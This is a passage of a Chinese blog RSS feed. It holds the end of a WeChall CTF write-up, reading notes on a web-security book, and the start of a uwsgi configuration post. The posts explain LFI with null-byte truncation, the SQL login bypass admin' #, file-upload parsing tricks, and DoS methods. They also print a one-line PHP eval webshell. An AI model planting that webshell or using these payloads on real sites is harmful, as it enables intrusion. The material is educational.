的十六进制的编码，这里的 00 就是eof 符号。由于 php 的内核是使用 C 进行编写的，所以这里会存在 00 截断的特性，所以构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 再次请求：</span><br><span class="line">https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00</span><br></pre></td></tr></table></figure><p>成功的pass。</p><h3 id="PHP-0817"><a href="#PHP-0817" class="headerlink" title="PHP-0817"></a>PHP-0817</h3><p>这个题目的如下， 一样是需要包含 本地的 solution 这个 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'which'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        $which = $_GET[<span class="string">'which'</span>];</span><br><span class="line">        <span class="keyword">switch</span> ($which)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">require_once</span> $which.<span class="string">'.php'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'PHP-0817'</span>, <span class="string">'Hacker NoNoNo!'</span>, <span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>整个过程是十分的简单，直接 构造， <code>which=solution</code> 即可。这里主要分析一下这个过程，这个导致的原因还是由于 php 的弱类型的特性导致的。这里的Switch 进行的是 整形的比较，所以 当which 是个字符串的时候，一样的会被莫名其妙的转化为了数字。从而绕过了，这个 switch 的判断。</p><blockquote><p>这里偶遇一篇很好的文章：</p><ul><li><span class="exturl" data-url="aHR0cDovL2FyY2hpbWVzYW4ubWUvMjAxNy8xMi8yMS9waHAlRTUlQkMlQjElRTclQjElQkIlRTUlOUUlOEIlRTYlQkMlOEYlRTYlQjQlOUUv" title="http://archimesan.me/2017/12/21/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/">PHP弱类型漏洞<i class="fa fa-external-link"></i></span></li></ul></blockquote><h3 id="MYSQL-1"><a href="#MYSQL-1" class="headerlink" title="MYSQL 1"></a>MYSQL 1</h3><p>这里是一个比较基础的注入，给出了源码，可以直接看出构造过程。：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='$username' AND password='$password'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === ($result = $db-&gt;queryFirst($query))) &#123;</span><br><span class="line"><span class="keyword">echo</span> GWF_HTML::error(<span class="string">'Auth1'</span>, $chall-&gt;lang(<span class="string">'err_unknown'</span>), <span class="keyword">false</span>); <span class="comment"># Unknown user</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点，就是在上面的输入参数里面对用户的输入没有进行检测，（所有的用户输入 都是邪恶的！）</p><p>这里构造思路很简单，当得到一个用户的查询记录就好了，密码？不存在的~。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; # &lt; 注释掉 后面的密码查询部分</span><br><span class="line">     ^ 用于闭合 admin 这个查询参数</span><br></pre></td></tr></table></figure><p>所以，构造上述的表单数据进行提交，即可。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dpdGh1Yl8zNjAzMjk0Ny9hcnRpY2xlL2RldGFpbHMvNzg0NDIxODk=" title="https://blog.csdn.net/github_36032947/article/details/78442189">SQL注入攻击常见方式及测试方法<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="PHP-全局变量覆盖"><a href="#PHP-全局变量覆盖" class="headerlink" title="PHP 全局变量覆盖"></a>PHP 全局变量覆盖</h3><p>这个也是在书中刚好看到了，很幸运。这个问题是 php 中的全局变量覆盖的问题。<code>REGISTER GLOBALS = ON</code> 导致，用户可以提交参数，覆盖了 php中的变量。导致很多问题。</p><p>这个题目中，一样的是一个登陆的过程，不过，贴出了源代码，可以更清楚的看到问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; is_string($_POST[<span class="string">'password'</span>]) &amp;&amp; is_string($_POST[<span class="string">'username'</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">$uname = GDO::escape($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$pass = md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$query = <span class="string">"SELECT level FROM "</span>.GWF_TABLE_PREFIX.<span class="string">"wc_chall_reg_glob WHERE username='$uname' AND password='$pass'"</span>;</span><br><span class="line">$db = gdo_db();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === ($row = $db-&gt;queryFirst($query))) &#123;</span><br><span class="line"><span class="keyword">echo</span> GWF_HTML::error(<span class="string">'Register Globals'</span>, $chall-&gt;lang(<span class="string">'err_failed'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment"># Login success</span></span><br><span class="line">$login = <span class="keyword">array</span>($_POST[<span class="string">'username'</span>], (int)$row[<span class="string">'level'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($login))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> GWF_HTML::message(<span class="string">'Register Globals'</span>, $chall-&gt;lang(<span class="string">'msg_welcome_back'</span>, <span class="keyword">array</span>(htmlspecialchars($login[<span class="number">0</span>]), htmlspecialchars($login[<span class="number">1</span>]))));</span><br><span class="line"><span class="keyword">if</span> (strtolower($login[<span class="number">0</span>]) === <span class="string">'admin'</span>) &#123;</span><br><span class="line">$chall-&gt;onChallengeSolved(GWF_Session::getUserID());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点，就在下面的 login 的状态检测，直接使用了 login 的0，1 的参数。所以这里，我们就使用变量覆盖：构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($login))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> GWF_HTML::message(<span class="string">'Register Globals'</span>, $chall-&gt;lang(<span class="string">'msg_welcome_back'</span>, <span class="keyword">array</span>(htmlspecialchars($login[<span class="number">0</span>]), htmlspecialchars($login[<span class="number">1</span>]))));</span><br><span class="line"><span class="keyword">if</span> (strtolower($login[<span class="number">0</span>]) === <span class="string">'admin'</span>) &#123;</span><br><span class="line">$chall-&gt;onChallengeSolved(GWF_Session::getUserID());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>便很顺利的，绕过了前面的密码的检测。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpdHdhbmdwZW5nL2FydGljbGUvZGV0YWlscy80NTk3MjA5OQ==" title="https://blog.csdn.net/hitwangpeng/article/details/45972099">[web安全] 变量覆盖漏洞<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h2><h3 id="Transposition-移位密码-置换密码"><a href="#Transposition-移位密码-置换密码" class="headerlink" title="Transposition 移位密码 (置换密码)"></a>Transposition 移位密码 (置换密码)</h3><p>题目如下移位密码，题目甚至很贴心的给出了 wiki <span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9UcmFuc3Bvc2l0aW9uX2NpcGhlcg==" title="http://en.wikipedia.org/wiki/Transposition_cipher">transposition ciphers<i class="fa fa-external-link"></i></span> 。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wc mldcpgsopb.l</span><br></pre></td></tr></table></figure><p>实际上，这里是对一个简单加密形式的一个认识。可以这样理解，把原文一句话，分割成多个片段，在每个片段里面进行字母的移位。比如第一个和第二个换位。以题目举例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oWdnreuf.lY uoc</span><br><span class="line">Wonderful.Y uoc</span><br><span class="line">214365214365124</span><br></pre></td></tr></table></figure><p>进行解密之后得到了 原明文.</p><h2 id="Stegano-隐写"><a href="#Stegano-隐写" class="headerlink" title="Stegano 隐写"></a>Stegano 隐写</h2><p>题目中给出了提示连接，这个是用软件点点点，但是原理要学会：</p><blockquote><p>Hidden Hint: <span class="exturl" data-url="aHR0cDovL3dlY2hhbGwuYmxvZ3Nwb3QuY29tLzIwMDcvMTEvc3RlZ2FuYWJhcmEtZXhwbGFpbmVkLmh0bWw=" title="http://wechall.blogspot.com/2007/11/steganabara-explained.html">Steganabara explained<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82NzIzM2Y2MDdmNzU=" title="https://www.jianshu.com/p/67233f607f75">隐写术总结<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>一般图像的隐写方式，使用LSB(Least Significant Bit),对内容进行隐写。因为图片，可以解析为一个矩阵，每个像素都是三原色的。(0,0,0)~(255,255,255) 如果使用最低有效位的话 (254,254,254) 这样就隐藏了三个 bit ，但是肉眼一般是看不出差距的。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Limit-Access"><a href="#Limit-Access" class="headerlink" title="Limit Access"></a>Limit Access</h3><p>Apache 的 访问认证的绕过。前面以为是 <code>.htpasswd</code> 的目录的访问，发现不是的，后面突然发现 ，limit 里面是指定了 限制的 Http 的请求方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AuthUserFile .htpasswd</span><br><span class="line">AuthGroupFile /dev/null</span><br><span class="line">AuthName &quot;Authorization Required for the Limited Access Challenge&quot;</span><br><span class="line">AuthType Basic</span><br><span class="line">&lt;Limit GET&gt;</span><br><span class="line">require valid-user</span><br><span class="line">&lt;/Limit&gt;</span><br></pre></td></tr></table></figure><p>Limit 了 GET方式，我们可以使用 POST ！js 脚本构造：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.post(<span class="string">'protected.php'</span>).success(<span class="function"><span class="keyword">function</span>(<span class="params">rdata</span>)</span>&#123;<span class="built_in">console</span>.log(rdata)&#125;)</span><br></pre></td></tr></table></figure><p>成功的，绕过了登陆限制。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>以上，简简单单的几个 题目的 writeUP 已经写完了，虽然都是相当的基础的类型的题目，不过，自己也是折腾了好一会，慢慢积累~还是挺有趣的~加油</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/10/21/CTF_WeChall_1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《白帽子讲WEB安全》</title>
      <link>https://www.diglp.xyz/2018/10/14/Book_%E7%99%BD%E5%B8%BD%E5%AD%90web/</link>
      <guid>https://www.diglp.xyz/2018/10/14/Book_%E7%99%BD%E5%B8%BD%E5%AD%90web/</guid>
      <pubDate>Sat, 13 Oct 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><blockquote><p>喜欢就去追寻</p><p>互联网本来是安全的。自从有了研究安全的人之后，互联网就变得不安全了。</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：白帽子讲WEB安全</li><li>作者：吴翰清</li><li>ISBN：9787121160721</li></ul><p>WEB 安全相关的入门书籍，范围很广，每个类型的威胁，都有相应的案例。</p><p>作为一本较为系统的拾遗书籍，加深自己对 WEB 安全的理解</p><h2 id="浏览器（用户）安全"><a href="#浏览器（用户）安全" class="headerlink" title="浏览器（用户）安全"></a>浏览器（用户）安全</h2><h3 id="浏览器的同源策略"><a href="#浏览器的同源策略" class="headerlink" title="浏览器的同源策略"></a>浏览器的同源策略</h3><p>如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的<strong>源</strong>。</p><p>浏览器自身用于保证安全的策略</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvU2VjdXJpdHkvU2FtZS1vcmlnaW5fcG9saWN5" title="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">浏览器的同源策略 - MDN<i class="fa fa-external-link"></i></span> </li><li><span class="exturl" data-url="aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTYvMDQvc2FtZS1vcmlnaW4tcG9saWN5Lmh0bWw=" title="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">浏览器同源政策及其规避方法 - ruanyf<i class="fa fa-external-link"></i></span></li></ul></blockquote><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>Cross-site request forgery,</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Cross-site scripting</p><h3 id="ClickJacking-点击劫持"><a href="#ClickJacking-点击劫持" class="headerlink" title="ClickJacking 点击劫持"></a>ClickJacking 点击劫持</h3><p>点击劫持，拖拽劫持，经典的例子是 把球放在 海豹的头上。</p><p>作用机理是使用 看不见的 iframe</p><h3 id="AUTH-and-Session-会话劫持"><a href="#AUTH-and-Session-会话劫持" class="headerlink" title="AUTH and Session 会话劫持"></a>AUTH and Session 会话劫持</h3><p>Cookies被窃取，被盗取了登陆状态 ， SessionID 存在。</p><p>当把 Session 放在 URL 里面存在更大的问题，比如有个 邮件里的地址，用户点击之后，这个请求会在 referer 里面带上上一个站点的信息，很容易的泄露了sessionID。</p><p>Cookie 保持：使用一个慢速的固定请求保持 cookie 的过期时间。</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNjE4NDczMA==" title="https://zhuanlan.zhihu.com/p/26184730">常见WEB漏洞<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="WEB服务器安全"><a href="#WEB服务器安全" class="headerlink" title="WEB服务器安全"></a>WEB服务器安全</h2><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>这个注入老问题了，后面补充把</p><h3 id="Upload-上传点"><a href="#Upload-上传点" class="headerlink" title="Upload 上传点"></a>Upload 上传点</h3><ul><li><p><strong>00 截断</strong></p><p>这部分是寻找上传点，并且绕过类型检测，以及正确解析。对于 php页面的上传点，如果文件名没有被修改，可以尝试 \00 进行截断。</p></li><li><p><strong>MIME Sniff</strong></p><p>如果通过对 文件头的魔数来识别类型的话，我们可以给 php 文件伪造一个 合法jpg的文件头，</p></li><li><p><strong>文件解析</strong></p><p>当然，上传了一个文件之后，要对其进行解析，否则只是个图片 </p><p>又想到之前的 <strong>一句话图马</strong> </p><ul><li><p>Apache 文件解析（特性）</p><p>apache 的 1.x 2.x 版本中，对文件后缀是 白名单设置 ，如果有文件文件名如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.php.qwe.qwe.qwe.qwe</span><br></pre></td></tr></table></figure><p>由于qwe 类型不在其白名单内，所以他不断遍历，直至第一个 php ，这样就把这个文件作为 php 进行解析了。所以 ，我可以伪造 jpg 后缀名绕过类型上传检测，之后使用该解析漏洞使得其进行执行。mine.type</p></li><li><p>IIS6</p><p>IIS 作为 win下的web 服务器，也是存在着解析漏洞，和 00 截断类似这里是 <code>;</code> 截断:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.asp;asdasd.jpg</span><br></pre></td></tr></table></figure><p>显然上面的是一个合法的 文件名，不过IIS 在进行进行的时候，就出现了截断为 <code>a.asp</code></p><p>且另外的一个漏洞是 如果可以新建文件夹， IIS 会把  <code>/*.asp/</code> 文件夹下面所有的 文件都作为 asp 文件进行执行。</p></li><li><p>nginx</p><p>Nginx 这个 官方称为特性的东西，存在于 <code>cgi.fix_pathinfo = 1</code> 这个选项中。实现这样的效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/test.jpg/test.php#本身这个文件不存在</span><br></pre></td></tr></table></figure><p>在这里，test.jpg 将会作为 php 文件进行解析，问题存在于 nginx 的特性里面，由于是 fast-cgi 的特性导致，由于是 php 结尾的 url 所以是被分发到了 fast-cgi。其按路径进行解析，就会找到 这个jpg 文件执行了。</p></li></ul></li></ul><h3 id="弱伪随机数-密码学安全"><a href="#弱伪随机数-密码学安全" class="headerlink" title="弱伪随机数/密码学安全"></a>弱伪随机数/密码学安全</h3><p>比较有意思，在后面对 加密算法 和加密模式做个总结</p><h3 id="Deny-of-Service"><a href="#Deny-of-Service" class="headerlink" title="Deny of Service"></a>Deny of Service</h3><p>正如其名 拒绝服务攻击，使WEB 服务器失去原有的服务能力，比如选课 XD</p><h4 id="协议层"><a href="#协议层" class="headerlink" title="协议层"></a>协议层</h4><p>经典方法直接想到的 就是进行疯狂的请求这种方法就称之为 <strong>泛洪</strong> flood</p><ul><li>SYN flood</li><li>UDP flood</li><li>UDP flood</li><li>ICMP flood    # ping </li></ul><p>可见 除了第一种，后面的都是完整的协议。使用最低的资源，得到最高的性能，这个当然是 DOS 所需要的。这里的 SYN 便是，SYN 很熟悉的出现在 网络中的 TCP 协议中，<code>syn syn/ack ack</code>  这样的一个三次握手的协议，SYN 不是一个完整的协议，所以其对发起攻击的要求更低了。</p><p>SYN flood 算的上是利用了 TPC 协议的漏洞。我们发起了 SYN 包之后，主机进行应答，我们不做任何回复，主机将进行重复的 3~5 次应答，直至 连接超时被施放。所以，可见 不应答的方法得到了更多的收益（资源占用）。所以SYN 泛洪是很常用的 DOS 的方法。对应方法，可以对 SYN 的发起地址 分配 Cookies 统计气质访问频率， 丢弃过多的请求。</p><h4 id="应用层-CC-攻击"><a href="#应用层-CC-攻击" class="headerlink" title="应用层 = CC 攻击"></a>应用层 = CC 攻击</h4><p>CC 攻击 起源 与对 绿盟的 反DOS 的设备（collaoasar黑洞）的挑战（challenge）所以简并 CC</p><p>其攻击原理不同于上面的网络层次。这里是对应用层次的请求进行泛洪，尽可能的消耗服务器的资源，比如 ：</p><p>数据库的增删查改。HTTP</p><p>在应用层产生的攻击其主要的解决方案，是配置服务器，对连接数进行限制，或者进行请求的分发</p><h4 id="Slowloris-攻击"><a href="#Slowloris-攻击" class="headerlink" title="Slowloris 攻击"></a>Slowloris 攻击</h4><p>这个也是应用层次的攻击， 可以说是利用了 HTTP 协议的漏洞。原理也好理解，我们的 请求中设置 Keep-Alive。而且我们发送畸形的请求头。正常的请求头是 以 \r\n\r\n 结束的。我们使用只有一个 \r\n 的请求头，这样服务器认为 没有有结束或者接收完整，便保持连接，客户端，再以缓慢的速度发送不完整数据，来保持连接。这样的进行数个 连接的保持，就可以很快占用了所有的连接数 导致 DOS。</p><h4 id="Server-Limie-DOS"><a href="#Server-Limie-DOS" class="headerlink" title="Server  Limie  DOS"></a>Server  Limie  DOS</h4><p>这个比较有意思，实际上进行DOS 的对象是用户本身，不是服务器。利用了 HTTP 报头的长度限制这一属性。HTTP 中对 请求头的长度限制是 8192Bytes 如果我们使用恶意脚本，在用户的Cookies里面，添加大量的无用信息。导致 请求被 远程服务器 丢弃。</p><blockquote><p>这个可以直接在 浏览器 的Cookies 进行修改，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; document.cookie = &apos;exp1=&apos; + &apos;a&apos; * 8192</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h2><p>PHP 由于其天生的  特性，所以在WEB 开发上得到了广泛的应用，PHP 作为动态 ，弱类型的语言在方便的同时的确带来了 许多的隐患。</p><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>这里的文件包含，在实际上指的是 代码注入， 使得用户代码在远程主机上非法执行。</p><h4 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含 LFI"></a>本地文件包含 LFI</h4><p>Local File inclusion 正如 python 的 import 一样，PHP 中用于 包含文件使用的 函数是：</p><ul><li>include() / include_once()</li><li>require() / require_once()</li></ul><p>在使用上面的函数对文件本身进行引入的时候，解释器会自动的执行引入文件所包含代码。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="keyword">include</span>($_GET[test])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是示例代码，使用 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl "http://localhost:8000/test.php?test=../a.php“ -v</span><br></pre></td></tr></table></figure><p>这样会导致远程主机上的a.php 的非法执行，</p><p><strong>TIPS:</strong> PHP 内河使用 C 艰辛编写所以在处理字符串的时候,会出现 00 截断,用于绕过不少的文件格式判断。</p><hr><p>这里提到了一个很有意思的<strong>远程文件包含</strong>的方法，WEB 服务器的日志注入。基于 SessionID 的注入。我们本地进行的恶意 Session内容 的构建 （如果可以），之后提交请求，服务器会将我们的 Session的内容进行保存。所以我们可以远程的 include 包含我们注入代码的 session 文件，从而导致了远程的代码包含的复现。</p><blockquote><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMTgyMjgwLmh0bWw=" title="http://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞<i class="fa fa-external-link"></i></span></li></ul></blockquote><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[test]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果有拿过站的，就一定知道，功夫再高也怕菜刀这句话。中国菜刀这样的东西，带来了一句话木马的浪潮，这里的一句话木马，就是典型的代码注入，使用这一句话，我们可以实现在远程主机上进行的代码执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl "http://localhost:8000/test.php?test=&lt;?php phpinfo();?&gt;“ -v</span><br></pre></td></tr></table></figure><blockquote><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvOTM5Ni5odG1s" title="http://www.freebuf.com/articles/web/9396.html">那些强悍的PHP一句话后门<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="Web-Server-安全"><a href="#Web-Server-安全" class="headerlink" title="Web Server 安全"></a>Web Server 安全</h2><p>这部分的问题，出在Web 服务器的 漏洞 ， 或者说 ummmmm  特性。</p><p>Apache 的问题，多数出现在核心模块里面，都是由于其他的模块可能引起的漏洞，但是存在 root 运行的问题，一道被getshell 就是root。Nginx 在不断进化 漏洞还是不少。JBoss 有8080 的默认后台 同 Tomcat 有 8080 的默认管理</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>发现了同样的一篇 WEB 安全的，</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xMjM4NWI4NGMzN2I=" title="https://www.jianshu.com/p/12385b84c37b">读白帽子讲WEB安全<i class="fa fa-external-link"></i></span> </li></ul></blockquote><p>随手 PICK 一下</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/10/14/Book_%E7%99%BD%E5%B8%BD%E5%AD%90web/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Uwsgi 配置问题记录</title>
      <link>https://www.diglp.xyz/2018/10/13/OP_Uwsgi%20%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
      <guid>https://www.diglp.xyz/2018/10/13/OP_Uwsgi%20%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
      <pubDate>Fri, 12 Oct 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;使用 Nginx 和 uwsgi 一起搭建提供 CGI
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>使用 Nginx 和 uwsgi 一起搭建提供 CGI 服务。本来时很顺利的搭建完成了环境。发现到另一台主机上就出现了葛总问题，这里记录一下</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>在 Nginx 的配置文件中的配置如下 ，在官方的模板配置里面也已经给出。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^/CGI</span> &#123;</span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^</span> /cgi-bin/x.py <span class="literal">last</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> /cgi-bin &#123;</span><br><span class="line">    <span class="comment"># internal;</span></span><br><span class="line">    <span class="attribute">include</span> <span class="variable">$nginx_root</span>/nginx/conf/uwsgi_params;</span><br><span class="line">    <span class="attribute">uwsgi_modifier1</span> <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">uwsgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>uwsgi协议魔术变量</strong>， 你可以通过使用web服务器（或一般使用一个uwsgi兼容的客户端）传递的专用的变量来动态调整或配置uWSGI服务器的各个方面。</p></blockquote><p><strong>uwsgi_param</strong>　文件的具体内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 